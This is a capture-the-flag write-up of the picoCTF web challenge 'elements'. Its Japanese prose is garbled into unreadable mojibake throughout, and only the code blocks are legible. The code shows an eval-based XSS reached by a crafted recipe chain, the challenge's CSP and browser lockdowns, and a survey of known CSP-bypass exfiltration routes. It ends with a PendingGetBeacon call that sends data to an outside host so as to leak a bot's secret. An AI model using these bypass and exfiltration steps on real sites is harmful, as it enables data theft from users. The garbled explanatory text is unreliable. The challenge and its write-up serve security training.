# elements:Web Exploitation:500pts
Insert Standard Web Challenge Here.  
Source code: [`elements.tar.gz`](/)  
Craft some magic up [here](http://rhea.picoctf.net:56994/)  

# Solution
URLã¨ã‚½ãƒ¼ã‚¹ãŒé…å¸ƒã•ã‚Œã‚‹ã€‚  
â€»ãƒ•ã‚¡ã‚¤ãƒ«ã‚µã‚¤ã‚ºã®å•é¡Œã§elements.tar.gzã‚’åˆ†å‰²ã—ã¦ã„ã‚‹(`cat elements.tar.gz-?? > elements.tar.gz`ã§æˆ»ã›ã‚‹)ã€‚  
```
0657fbfc68bdcc940c3fab116eed76bcb3effc47  elements.tar.gz
1f40eab367eb3132420db6498fd57c2a04bb10e9  elements.tar.gz-00
fc4b0a401625369ba4484b01841f525bce45bdd7  elements.tar.gz-01
7f9755a71e356ba70f712386e61d7fda53133ded  elements.tar.gz-02
1f5afc935782f774fe22553bb83087acba9fe6d7  elements.tar.gz-03
```
URLã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€äºŒç¨®é¡žã®ç´ æã‚’æ··åˆã—ã¦æ–°ã—ã„ç´ æã‚’ä½œæˆã™ã‚‹ã‚²ãƒ¼ãƒ ã®ã‚ˆã†ã ã€‚  
è©¦ã—ã«ã€`Fire`ã¨`Water`ã‚’æ··åˆã™ã‚‹ã¨`Steam`ã«ãªã‚Šã€`Earth`ã¨`Air`ã‚’æ··åˆã™ã‚‹ã¨`Dust`ã¨ãªã£ãŸã€‚  
![site.png](site/site.png)  
ä½œã£ãŸç´ æã‚’ç”¨ã„ã¦ã•ã‚‰ã«æ–°ã—ã„ç´ æã‚’ä½œã‚‹ã“ã¨ã‚‚å¯èƒ½ãªã‚ˆã†ã ã€‚  
ä¸€é€šã‚Šã‚²ãƒ¼ãƒ ã‚’æ¥½ã—ã‚“ã å¾Œã€é…å¸ƒã•ã‚ŒãŸã‚½ãƒ¼ã‚¹ã‚’è¦‹ã‚‹ã€‚  
ã‚²ãƒ¼ãƒ ã‚’å®Ÿç¾ã—ã¦ã„ã‚‹ãƒ•ãƒ­ãƒ³ãƒˆã®JavaScriptã®ä¸»è¦éƒ¨åˆ†ã¯ä»¥ä¸‹ã®ã‚ˆã†ã§ã‚ã£ãŸã€‚  
```js
~~~
// these were all generated by ai, yes they have some really weird results
const recipes = [["Ash","Fire","Charcoal"],["Steam Engine","Water","Vapor"],
~~~
,["Geolocation","Location Tracking","Real-Time Positioning"]];

const elements = new Map([["Sauna","ðŸ’¦"],["Railway Engine","ðŸš‚"],
~~~
,["Paving Stone","ðŸ› ï¸"],["Artwork","ðŸŽ¨"]]);

const cache = new Map();

let found = new Map([['Fire', 'ðŸ”¥'], ['Water', 'ðŸ’§'], ['Earth', 'ðŸŒ'], ['Air', 'ðŸ’¨']]);

~~~

const evaluate = (...items) => {
	const [a, b] = items.sort();
	for (const [ingredientA, ingredientB, result] of recipes) {
		if (ingredientA === a && ingredientB == b) {
			if (result === 'XSS' && state.xss) {
				eval(state.xss);
			}
			return result;
		}
	}
	return null;
}

const colliding = (elementA, elementB) => {
	const [a, b] = [elementA.getBoundingClientRect(), elementB.getBoundingClientRect()];
	return a.right >= b.left && a.left <= b.right && a.bottom >= b.top && a.top <= b.bottom;
}

~~~

try {
	state = JSON.parse(atob(window.location.hash.slice(1)));
	for (const [a, b] of state.recipe) {
		if (!found.has(a) || !found.has(b)) {
			break;
		}
		const result = evaluate(a, b);
		found.set(result, elements.get(result));
	}
} catch(e) {}
```
å®šç¾©ã•ã‚ŒãŸç´ æã¨ãƒ¬ã‚·ãƒ”ã®é…åˆ—ã‚’ä½¿ã£ã¦ã‚²ãƒ¼ãƒ ã‚’å®Ÿç¾ã—ã¦ãŠã‚Šã€ç´ æã®åº§æ¨™ãŒé‡ãªã‚‹ã¨ãƒ¬ã‚·ãƒ”é€šã‚Šã«æ–°ãŸãªç´ æãŒä½œæˆã•ã‚Œã‚‹ã€‚  
åˆã‚ã«æ‰€æŒã—ã¦ã„ã‚‹ç´ æã¯`['Fire', 'ðŸ”¥'], ['Water', 'ðŸ’§'], ['Earth', 'ðŸŒ'], ['Air', 'ðŸ’¨']`ã®4ã¤ã§ã‚ã‚‹ã‚ˆã†ã§ã€ç´ æã¯æ–°ãŸã«ä½œæˆã™ã‚‹ã¨è¿½åŠ ã•ã‚Œã‚‹ã€‚  
ã¾ãŸã€`window.location.hash.slice(1)`ã‹ã‚‰base64ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸJSONæ–‡å­—åˆ—ã‚’å—ã‘å–ã‚Šã€`recipe`è¦ç´ ã®é…åˆ—ã§ç´ æã®è‡ªå‹•ä½œæˆãŒè¡Œãˆã‚‹ã‚ˆã†ã§ã‚ã‚‹(ã‚»ãƒ¼ãƒ–èª­ã¿è¾¼ã¿ã®ã‚ˆã†ãªæ©Ÿèƒ½)ã€‚  
ãã®éš›ã«ä½œæˆã•ã‚ŒãŸç´ æãŒ`XSS`ã§ã‚ã‚‹å ´åˆã«ã€JSONã®`xss`è¦ç´ ã®ãƒ†ã‚­ã‚¹ãƒˆã‚’`eval`ã—ã¦ã„ã‚‹ã€‚  
æ˜Žã‚‰ã‹ã«XSSå•é¡Œã®ã‚ˆã†ã§`eval`ã‚’èµ°ã‚‰ã›ã‚‹ã®ãŒã‚´ãƒ¼ãƒ«ã§ã‚ã‚‹ã¨ã‚ã‹ã‚‹ã®ã§ã€ã¾ãšã¯ç´ æ`XSS`ã‚’ä½œã‚‹å¿…è¦ãŒã‚ã‚‹ã€‚   
`XSS`ã‚’æ ¹ã¨ã™ã‚‹æœ¨æ§‹é€ ã¨ã—ã¦ãƒ¬ã‚·ãƒ”ã‚’é€†ã«ãŸã©ã‚Šã€è‘‰ãŒ4ã¤ã®åˆã‚ã«æ‰€æŒã—ã¦ã„ã‚‹ç´ æã«ãªã‚‹ã¾ã§å¹…å„ªå…ˆæŽ¢ç´¢ã‚’è¡Œãˆã°ã‚ˆã„ã€‚  
è‡ªå‹•åŒ–ã—ã¦ã‚‚ã‚ˆã„ãŒã€æ‰‹å‹•ã§ã‚‚å•é¡Œãªãä½œæˆã§ãã‚‹ã€‚  
ä»¥ä¸‹ã®é€šã‚Šã«ãªã‚‹ã€‚  
```
["Exploit", "Web Design", "XSS"]
-----
["Cybersecurity", "Vulnerability", "Exploit"]
["Internet", "Program", "Web Design"]
-----
["Encryption", "Software", "Cybersecurity"]
["Glass", "Software", "Vulnerability"]
["Air", "Rock", "Internet"]
["Computer Chip", "Software", "Program"]
-----
["Artificial Intelligence", "Data", "Encryption"]
["Fire", "Sand", "Glass"]
["Magma", "Mist", "Rock"]
["Computer Chip", "Electricity", "Software"]
-----
["Computer Chip", "Steam Engine", "Artificial Intelligence"]
["Computer Chip", "Fire", "Data"]
["Dust", "Heat Engine", "Sand"]
["Hot Spring", "Steam Engine", "Electricity"]
-----
["Earth", "Obsidian", "Computer Chip"]
["Air", "Earth", "Dust"]
["Fire", "Steam Engine", "Heat Engine"]
-----
["Hot Spring", "Sludge", "Steam Engine"]
-----
["Obsidian", "Water", "Hot Spring"]
["Fog", "Mud", "Sludge"]
-----
["Magma", "Mud", "Obsidian"]
["Fire", "Mist", "Fog"]
-----
["Earth", "Fire", "Magma"]
["Earth", "Water", "Mud"]
["Air", "Water", "Mist"]
```
ã“ã‚Œã‚’é€†é †ã«ã—ãŸã‚‚ã®ãŒ`XSS`ç”Ÿæˆã®ãƒ¬ã‚·ãƒ”ã¨ãªã‚‹ã€‚  
```js
[
["Air", "Water"], 
["Earth", "Water"], 
["Earth", "Fire"], 
["Fire", "Mist"], 
["Magma", "Mud"], 
["Fog", "Mud"], 
["Obsidian", "Water"], 
["Hot Spring", "Sludge"], 
["Fire", "Steam Engine"], 
["Air", "Earth"], 
["Earth", "Obsidian"], 
["Hot Spring", "Steam Engine"], 
["Dust", "Heat Engine"], 
["Computer Chip", "Fire"], 
["Computer Chip", "Steam Engine"], 
["Computer Chip", "Electricity"], 
["Magma", "Mist"], 
["Fire", "Sand"], 
["Artificial Intelligence", "Data"], 
["Computer Chip", "Software"], 
["Air", "Rock"], 
["Glass", "Software"], 
["Encryption", "Software"], 
["Internet", "Program"], 
["Cybersecurity", "Vulnerability"], 
["Exploit", "Web Design"]
]
```
ç´ æ`XSS`ãŒå®Œæˆã—ã€ä»»æ„ã®JavaScriptã‚’`eval`ã§ãã‚‹ã€‚  
æ¬¡ã«ãƒ•ãƒ©ã‚°ã®å ´æ‰€ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã€ã‚µãƒ¼ãƒãƒ¼ã®ã‚½ãƒ¼ã‚¹ã‚’è¦‹ã‚‹ã€‚  
```js
import { createServer } from 'node:http';
import assert from 'node:assert';
import { spawn } from 'node:child_process';
import { mkdir, mkdtemp, writeFile, rm, readFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

const sleep = delay => new Promise(res => setTimeout(res, delay));

const html = await readFile('static/index.html', 'utf-8');
const js = await readFile('static/index.js', 'utf-8');
const flag = await readFile('flag.txt', 'utf-8');

let visiting = false;

async function visit(state) {
	if (visiting) return;
	visiting = true;

	state = {...state, flag }

	const userDataDir = await mkdtemp(join(tmpdir(), 'elements-'));

	await mkdir(join(userDataDir, 'Default'));
	await writeFile(join(userDataDir, 'Default', 'Preferences'), JSON.stringify({
		net: {
			network_prediction_options: 2
		}
	}));

	const proc = spawn(
		'/usr/bin/chromium-browser-unstable', [
			`--user-data-dir=${userDataDir}`,
			'--profile-directory=Default',
			'--no-sandbox',
			'--js-flags=--noexpose_wasm,--jitless',
			'--disable-gpu',
			'--no-first-run',
			'--enable-experimental-web-platform-features',
			`http://127.0.0.1:8080/#${Buffer.from(JSON.stringify(state)).toString('base64')}`
		],
		{ detached: true }
	)

	await sleep(10000);
	try {
		process.kill(-proc.pid)
	} catch(e) {}
	await sleep(500);

	await rm(userDataDir, { recursive: true, force: true, maxRetries: 10 });

	visiting = false;
}

createServer((req, res) => {
	const url = new URL(req.url, 'http://127.0.0.1');

	const csp =  [
		"default-src 'none'",
		"style-src 'unsafe-inline'",
		"script-src 'unsafe-eval' 'self'",
		"frame-ancestors 'none'",
		"worker-src 'none'",
		"navigate-to 'none'"
	]

	// no seriously, do NOT attack the online-mode server!
	// the solution literally CANNOT use it!
	if (req.headers.host !== '127.0.0.1:8080') {
		csp.push("connect-src https://elements.attest.lol/");
	}

	res.setHeader('Content-Security-Policy', csp.join('; '));
	res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');
	res.setHeader('X-Frame-Options', 'deny');
	res.setHeader('X-Content-Type-Options', 'nosniff');

	if (url.pathname === '/') {
		res.setHeader('Content-Type', 'text/html');
		return res.end(html);
	} else if (url.pathname === '/index.js') {
		res.setHeader('Content-Type', 'text/javascript');
		return res.end(js);
	} else if (url.pathname === '/remoteCraft') {
		try {
			const { recipe, xss } = JSON.parse(url.searchParams.get('recipe'));
			assert(typeof xss === 'string');
			assert(xss.length < 300);
			assert(recipe instanceof Array);
			assert(recipe.length < 50);
			for (const step of recipe) {
				assert(step instanceof Array);
				assert(step.length === 2);
				for (const element of step) {
					assert(typeof xss === 'string');
					assert(element.length < 50);
				}
			}
			visit({ recipe, xss });
		} catch(e) {
			console.error(e);
			return res.writeHead(400).end('invalid recipe!');
		}
		return res.end('visiting!');
	}

	return res.writeHead(404).end('not found');
}).listen(8080);
```
ã‚µãƒ¼ãƒã¯ã‚¯ãƒ­ãƒ¼ãƒ©ã®å½¹å‰²ã‚‚æžœãŸã—ã¦ãŠã‚Šã€`/remoteCraft`ã§å—ã‘å–ã£ãŸã‚¯ã‚¨ãƒªãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿`recipe`ã‚’`JSON.parse`ã—ã¦ã‹ã‚‰`recipe`ã¨`xss`ã‚’å–å¾—ã—ã€åž‹ã‚„é•·ã•ã‚’æ¤œè¨¼ã—ã¦ã„ã‚‹(`element`ã®åž‹æ¤œæŸ»ã‚’ãƒŸã‚¹ã£ã¦ã„ã‚‹ãŒ)ã€‚  
ã•ã‚‰ã«ãã‚Œã‚‰ã‚’`visit`é–¢æ•°ã¸å—ã‘æ¸¡ã—ã¦ã„ã‚‹ã€‚  
`visit`é–¢æ•°ã¯ã‚¯ãƒ­ãƒ¼ãƒ©æœ¬ä½“ã§ã€ã‚½ãƒ¼ã‚¹ã«å«ã¾ã‚Œã¦ã„ãŸchromiumã‚’ä½¿ã£ã¦ãƒ•ãƒ­ãƒ³ãƒˆã®ç´ æä½œæˆã‚²ãƒ¼ãƒ ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã€‚  
ãã®éš›ã«ã€å—ã‘å–ã£ãŸ`recipe`ã¨`xss`ã‚’å«ã‚€ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã«`flag`ã‚’è¿½åŠ ã—ã¦ã€`JSON.stringify`ã—base64ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã—ãŸã‚‚ã®ã‚’URLãƒ•ãƒ©ã‚°ãƒ¡ãƒ³ãƒˆã¨ã—ã¦ä»˜åŠ ã—ã¦ã„ã‚‹ã€‚  
å•é¡Œè¨­å®šã‚’è¦ç´„ã™ã‚‹ã¨ã€ãƒ¦ãƒ¼ã‚¶ã‹ã‚‰å—ã‘å–ã£ãŸ`recipe`ã¨`xss`ã‚’èª­ã¿è¾¼ã‚“ã ç´ æä½œæˆã‚²ãƒ¼ãƒ ã§XSSã—ã¦ã€URLãƒ•ãƒ©ã‚°ãƒ¡ãƒ³ãƒˆã«è¿½åŠ ã•ã‚Œã¦ã„ã‚‹`flag`ã‚’å–å¾—ã—ã‚ã¨ã®ã“ã¨ã‚‰ã—ã„ã€‚  
`eval`ãŒã§ãã‚‹ãƒ¬ã‚·ãƒ”ã‚’æŒã£ã¦ã„ã‚‹ã®ã§ã€XSSã§URLãƒ•ãƒ©ã‚°ãƒ¡ãƒ³ãƒˆã‚’å¤–éƒ¨ã‚µãƒ¼ãƒã«é€ä¿¡ã™ã‚Œã°ã„ã„ã¨æ€ã†ãŒã€ä»¥ä¸‹ã®å„ç¨®åˆ¶é™ãŒã‚ã‚‹ã€‚  

**åˆ¶é™1. CSPã§ã®åˆ¶é™**  
ãƒšãƒ¼ã‚¸ã«ã¯ä»¥ä¸‹ã®é€šã‚Šã€ã‹ãªã‚Šå¼·å›ºãªCSPãŒã¤ã„ã¦ã„ã‚‹ã€‚  
```js
	const csp =  [
		"default-src 'none'",
		"style-src 'unsafe-inline'",
		"script-src 'unsafe-eval' 'self'",
		"frame-ancestors 'none'",
		"worker-src 'none'",
		"navigate-to 'none'"
	]
```
åŸºæœ¬çš„ã¨ãªã‚‹ã€å¤–éƒ¨ã«æƒ…å ±ã‚’é€ä¿¡ã™ã‚‹ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã¯ä»¥ä¸‹ãŒ[çŸ¥ã‚‰ã‚Œã¦ã„ã‚‹]((https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Content-Security-Policy/connect-src))ã€‚  

- a tag ping  
- fetch  
- XMLHttpRequest  
- WebSocket  
- EventSource  
- Navigator.sendBeacon  

ä»Šå›žã¯`connect-src`ãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ãŒãªã„ãŸã‚ã€å…¨ã¦ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ãŒ`default-src 'none'`ã§ãƒ–ãƒ­ãƒƒã‚¯ã•ã‚Œã‚‹ã€‚  
iframeã‚¿ã‚°ã§èª­ã¿è¾¼ã‚“ã§ã‚„ã‚‹æ‰‹æ³•ã‚‚`frame-ancestors 'none'`ã«é˜»ã¾ã‚Œã‚‹ã—ã€formãªã©ã§ã®é·ç§»ã¯`navigate-to 'none'`ã§ç¦æ­¢ã•ã‚Œã¦ã„ã‚‹ã€‚  
`s = window.open`ã®å¾Œã«`s.eval`ã™ã‚‹ã‚ˆã†ãªæ‰‹ã‚‚ä½¿ãˆãªã„(ãã‚‚ãã‚‚ãƒãƒƒãƒ—ã‚¢ãƒƒãƒ—ãƒ–ãƒ­ãƒƒã‚¯ã‚‚ã‚ã‚‹)ã€‚  
CSPãŒåŠ¹ã„ã¦ã“ãªã„ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã§ããã†ãªã‚µãƒ¼ãƒ“ã‚¹ãƒ¯ãƒ¼ã‚«ãƒ¼ã‚‚`worker-src 'none'`ã§ç¦æ­¢ã•ã‚Œã¦ã„ã‚‹ã€‚  

**åˆ¶é™2. ãƒ–ãƒ©ã‚¦ã‚¶ãƒãƒªã‚·ãƒ¼ã§ã®åˆ¶é™**  
Dockerfileã‚’è¦‹ã‚‹ã¨`policy.json`ãªã‚‹ã‚‚ã®ã‚’æŒ‡å®šã—ã¦ã„ã‚‹ã€‚  
```Dockerfile
FROM --platform=amd64 node:21-bookworm-slim

ADD chrome.deb /tmp/chrome.deb
RUN apt-get update && \
	apt-get install -y /tmp/chrome.deb && \
	apt-get install -y xvfb && \
	rm -rf /var/lib/apt/lists/* /tmp/chrome.deb

WORKDIR /app

COPY flag.txt .
COPY index.mjs start_display.sh ./
COPY static ./static
COPY policy.json /etc/chromium/policies/managed/policy.json

CMD ./start_display.sh & DISPLAY=:99.0 su node -c "node index.mjs"
```
å†…å®¹ã¯ä»¥ä¸‹ã§ã‚ã£ãŸã€‚  
```json
{"URLAllowlist":["127.0.0.1:8080"],"URLBlocklist":["*"]}
```
ãã®åã®é€šã‚Šãƒ–ãƒ©ã‚¦ã‚¶ã®ãƒãƒªã‚·ãƒ¼ã‚’è¨­å®šã™ã‚‹ã“ã¨ãŒã§ãã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã®ã‚ˆã†ã§ã€ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ãªURLã‚’`127.0.0.1:8080`ã ã‘ã«ã—ã¦ã„ã‚‹ã€‚  
ã“ã‚Œã«ã‚ˆã£ã¦ç‰¹å®šã®æ¡ä»¶ã§metaã‚¿ã‚°ã§é·ç§»ã—ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ã‚ªãƒ©ã‚¯ãƒ«ã¨ã™ã‚‹ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ãŒç„¡åŠ¹åŒ–ã•ã‚Œã¦ã„ã‚‹ã€‚  

**åˆ¶é™3. WebRTCæ©Ÿèƒ½ã®å‰Šé™¤**  
chromium.diffãªã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ãŒã‚½ãƒ¼ã‚¹ã«å«ã¾ã‚Œã¦ã„ã‚‹ãŸã‚ã€chromiumè‡ªä½“ã‚‚æ”¹é€ ã•ã‚Œã¦ã„ã‚‹ã‚‰ã—ã„ã€‚  
å†…å®¹ã¯ä»¥ä¸‹ã§ã‚ã£ãŸã€‚  
```diff
diff --git a/third_party/blink/renderer/modules/peerconnection/rtc_peer_connection.idl b/third_party/blink/renderer/modules/peerconnection/rtc_peer_connection.idl
index f0948629cb..393e7c77e0 100644
--- a/third_party/blink/renderer/modules/peerconnection/rtc_peer_connection.idl
+++ b/third_party/blink/renderer/modules/peerconnection/rtc_peer_connection.idl
@@ -61,10 +61,7 @@ enum RTCPeerConnectionState {
 // https://w3c.github.io/webrtc-pc/#interface-definition

 [
-    ActiveScriptWrappable,
-    Exposed=Window,
-    LegacyWindowAlias=webkitRTCPeerConnection,
-    LegacyWindowAlias_Measure
+    ActiveScriptWrappable
 ] interface RTCPeerConnection : EventTarget {
     // TODO(https://crbug.com/1318448): Deprecated `mediaConstraints` should be removed.
     [CallWith=ExecutionContext, RaisesException] constructor(optional RTCConfiguration configuration = {}, optional GoogMediaConstraints mediaConstraints);
```
`RTCPeerConnection`ã‚„`webkitRTCPeerConnection`ã‚’Windowã‹ã‚‰è¦‹ãˆãªã„ã‚ˆã†ã«ãƒ‘ãƒƒãƒã‚’å½“ã¦ã¦ã„ã‚‹ã€‚  
WebRTCã§ã¯DNSè§£æ±ºã‚’åˆ©ç”¨ã—ã¦ã€ã‚µãƒ–ãƒ‰ãƒ¡ã‚¤ãƒ³ã‹ã‚‰æƒ…å ±ã‚’å¤–éƒ¨ã«é€ä¿¡ã™ã‚‹CSPãƒã‚¤ãƒ‘ã‚¹æ‰‹æ³•ãŒ[çŸ¥ã‚‰ã‚Œã¦ã„ã‚‹](https://book.hacktricks.xyz/v/jp/pentesting-web/content-security-policy-csp-bypass#webrtc)ã€‚  
ã“ã‚Œã‚’ç„¡åŠ¹åŒ–ã™ã‚‹æ„å›³ãŒã‚ã‚Šãã†ã ã€‚  
ã¡ãªã¿ã«Chromiumã¯`Version 122.0.6261.111 (Developer Build) unstable (64-bit)`ã§ã‚ã‚Šã€æ–°ã—ã„ã€‚  

**åˆ¶é™4. ãƒ—ãƒªãƒ­ãƒ¼ãƒ‰æ©Ÿèƒ½ã®ç„¡åŠ¹åŒ–**  
ã‚½ãƒ¼ã‚¹ä¸­ã§`elements-`ã‹ã‚‰å§‹ã¾ã‚‹ãƒ©ãƒ³ãƒ€ãƒ ãªãƒ¦ãƒ¼ã‚¶ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’ä½œæˆã—ã€ä»¥ä¸‹ã®ã‚ˆã†ã«ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’æ›¸ãè¾¼ã‚“ã§ã„ã‚‹ã€‚  
```js
	const userDataDir = await mkdtemp(join(tmpdir(), 'elements-'));

	await mkdir(join(userDataDir, 'Default'));
	await writeFile(join(userDataDir, 'Default', 'Preferences'), JSON.stringify({
		net: {
			network_prediction_options: 2
		}
	}));
```
ã“ã®`network_prediction_options: 2`ã¨ã„ã†è¨­å®šã‚’è¡Œã†ã¨ã€HTMLè¦ç´ ãªã©ã®ãƒ—ãƒªãƒ­ãƒ¼ãƒ‰(å…ˆèª­ã¿æ©Ÿèƒ½)ã‚’offã«ãªã‚‹ã€‚  
linkã‚¿ã‚°ã®dns-prefetchã‚’åˆ©ç”¨ã—ã¦ã€WebRTCã¨åŒã˜ãDNSè§£æ±ºã§CSPã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹æ‰‹æ³•ãŒ[çŸ¥ã‚‰ã‚Œã¦ã„ã‚‹](https://book.hacktricks.xyz/v/jp/pentesting-web/content-security-policy-csp-bypass#dns-prefetch)ãŒã€ã“ã‚Œã‚‚ç„¡åŠ¹åŒ–ã•ã‚Œã¦ã„ã‚‹ã€‚  

ã“ã“ã¾ã§ã§ã€ä¸€èˆ¬ã«CSPã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã¦æƒ…å ±ã‚’æŒã¡å‡ºã™æ‰‹æ³•ãŒå…¨ã¦ãƒ–ãƒ­ãƒƒã‚¯ã•ã‚Œã¦ã„ã‚‹ã“ã¨ãŒåˆ†ã‹ã£ãŸã€‚  
ã¡ãªã¿ã«é–‹ç™ºè€…ãƒ„ãƒ¼ãƒ«ãŒé–‹ã„ã¦ã„ã‚‹å ´åˆã«`sourceMappingURL`ã§ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é£›ã°ã™ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ãŒã‚ã‚‹ãŒä»Šå›žã¯ä½¿ãˆãªã„ã€‚  
ç·åˆã™ã‚‹ã¨ã€æ–°ã—ã„CSPãƒã‚¤ãƒ‘ã‚¹ã®ãƒ‡ãƒ¼ã‚¿æŒã¡å‡ºã—ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’æŽ¢ã›ã¨ã„ã†ã“ã¨ã®ã‚ˆã†ã ã€‚  
[Chromium Issue Tracker](https://issues.chromium.org/issues)ã§Issueã‚’æŽ¢ã™ã‚‚ã€ä½•ã‚‚è¦‹ã¤ã‹ã‚‰ãªã„ã€‚  
ã“ã“ã§ã‚¯ãƒ­ãƒ¼ãƒ©éƒ¨åˆ†ã®ã‚½ãƒ¼ã‚¹ã‚’è¦‹ã¦ã„ã‚‹ã¨ä»¥ä¸‹ã®ç®‡æ‰€ãŒæ°—ã«ãªã‚‹ã€‚  
```js
~~~
	const proc = spawn(
		'', [
			`--user-data-dir=${userDataDir}`,
			'--profile-directory=Default',
			'--no-sandbox',
			'--js-flags=--noexpose_wasm,--jitless',
			'--disable-gpu',
			'--no-first-run',
			'--enable-experimental-web-platform-features',
			`http://127.0.0.1:8080/#${Buffer.from(JSON.stringify(state))}`
		],
		{ detached: true }
	)
~~~
```
ã‚ã¾ã‚Šè¦‹ã‚‹ã“ã¨ã®ãªã„`--enable-experimental-web-platform-features`ãªã‚‹ã‚ªãƒ—ã‚·ãƒ§ãƒ³ãŒã¤ã„ã¦ã„ã‚‹ã€‚  
ã“ã‚Œã¯è©¦é¨“é‹ç”¨ä¸­ã®æ©Ÿèƒ½ã‚’æœ‰åŠ¹åŒ–ã™ã‚‹ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã§ã‚ã‚‹ãŸã‚ã€ä½•ã‚‰ã‹ã®è©¦é¨“çš„ãªæ©Ÿèƒ½ã‚’ç”¨ã„ã‚‹ã®ã§ã¯ãªã„ã‹ã¨äºˆæƒ³ã™ã‚‹ã€‚  
è©¦é¨“çš„ãªæ©Ÿèƒ½ã«ã¯CSPã®åˆ¶é™ãŒã‹ã‹ã£ã¦ã„ãªã„ã“ã¨ã‚‚ã‚ã‚‹ã€‚  
[Chrome Platform Status](https://chromestatus.com/roadmap)ã‹ã‚‰è¿½åŠ ã•ã‚ŒãŸæ©Ÿèƒ½ãŒç¢ºèªã§ãã‚‹ã®ã§ã€å„ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®è©¦é¨“çš„ãªæ©Ÿèƒ½ã®ä¸­ã§ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ç™ºç”Ÿã•ã›ã‚‹ã‚ˆã†ãªã‚‚ã®ã‚’æŽ¢ã™ã€‚  
ã™ã‚‹ã¨Chrome 121ã§[fetchLater API](https://chromestatus.com/feature/4654499737632768)ãªã‚‹æ©Ÿèƒ½ãŒOrigin trialã¨ã—ã¦å…¥ã£ã¦ã„ã‚‹ã€‚  
![chrome121.png](images/chrome121.png)  
[ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ](https://github.com/WICG/pending-beacon/blob/main/docs/fetch-later-api.md)ã‚’è¦‹ã«è¡Œãã¨ã€åå‰ã®é€šã‚Šé…å»¶ã—ã¦fetchã—ã¦ãã‚Œã‚‹ã‚‰ã—ã„ã€‚  
ã—ã‹ã—ã€æœ‰åŠ¹ã§ã¯ãªã‹ã£ãŸãŸã‚ä»£æ›¿æ¡ˆã‚’æŽ¢ã—ã¦ã„ã‚‹ã¨åŒã˜ãƒšãƒ¼ã‚¸ã«`PendingBeacon API (deprecated)`ãªã‚‹[ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ](https://github.com/WICG/pending-beacon/blob/main/docs/pending-beacon-api.md)ãŒã‚ã‚‹ã“ã¨ã«æ°—ã¥ãã€‚  
ã“ã‚Œã‚‚ãƒšãƒ¼ã‚¸ãŒç ´æ£„ã•ã‚ŒãŸéš›ã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é£›ã°ã™APIã®ã‚ˆã†ã (ãŸã ã—HTTPSã«ã®ã¿é€ä¿¡ã§ãã‚‹ã¨ã„ã†åˆ¶é™ã‚‚ã‚ã‚‹)ã€‚  
è©¦ã—ã«å„ç¨®åˆ¶é™ã‚’ç››ã‚Šè¾¼ã‚“ã Chromiumç’°å¢ƒã§åˆ©ç”¨ã™ã‚‹ã¨ã€å®Ÿéš›ã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å¤–éƒ¨ã¸é€ä¿¡ã§ãã‚‹ã“ã¨ãŒåˆ¤æ˜Žã—ãŸã€‚  
ã“ã“ã§ä¸€ã¤å•é¡ŒãŒã‚ã‚‹ã€‚  
`PendingBeacon API`ã¯ãƒšãƒ¼ã‚¸ãŒç ´æ£„ã•ã‚ŒãŸéš›ã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒé£›ã¶ãŒã€ä»Šå›žã®ã‚¯ãƒ­ãƒ¼ãƒ©ã¯ä»¥ä¸‹ã®ã‚ˆã†ã«`process.kill`ã•ã‚Œã¦ã„ã‚‹ã€‚  
```js
~~~
	try {
		process.kill(-proc.pid)
	} catch(e) {}
~~~
```
ãã®ãŸã‚ã€ãƒšãƒ¼ã‚¸ç ´æ£„ã®éš›ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒé£›ã‚“ã§ã“ãªã„ã€‚  
å›°ã£ã¦ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’èª­ã‚€ã¨`timeout`ãªã‚‹ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä»˜ã‘ã‚‹ã“ã¨ã§ã€ãƒšãƒ¼ã‚¸ç ´æ£„ã•ã›ãšã¨ã‚‚ä¸€å®šæ™‚é–“çµŒéŽã™ã‚‹ã¨ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ã‚Œã‚‹ã‚ˆã†ã ã€‚  
ä»¥ä¸‹ã®ã‚ˆã†ãªJavaScriptã§å¤–éƒ¨ã¸ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆé€ä¿¡ã‚’é”æˆã§ãã‚‹ã€‚  
```js
beacon = new PendingGetBeacon('https://example.com/', {timeout: 1000});
```
